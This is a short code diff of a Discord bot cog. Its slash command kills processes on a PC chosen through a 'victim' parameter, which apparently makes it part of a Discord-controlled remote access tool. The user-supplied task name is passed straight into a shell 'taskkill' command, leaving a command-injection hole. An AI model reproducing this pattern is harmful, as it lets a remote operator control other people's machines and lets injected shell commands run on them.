@@ -63,7 +63,7 @@ class TaskList(commands.Cog):
                 )
 
     @commands.slash_command( )
-    async def kill_runningtasks(self, ctx, victim, task):     
+    async def kill_runningtasks(self, ctx, victim, task):
         """Kills a running task on this PC. [NOTE: ADMIN TASK'S CANT BE KILLED]
         
         Parameters
@@ -74,16 +74,16 @@ class TaskList(commands.Cog):
         
         if str(victim) == str(self.bot.identifier):
             await ctx.response.defer()
-            
-            list = os.popen('taskkill /f /t /im ' + task).read() # I SWEAR...
-            
+
+            list = os.popen(f'taskkill /f /t /im {task}').read()
+
             if len(list) <= 1:
                 return await ctx.followup.send(
                     embed = self.bot.genEmbed(
                         "Unable to find process!",
                         datetime.now()
                     )
-                )  
+                )
             if len(list) > 1998:
                 return await ctx.followup.send(
                     file=discord.File(
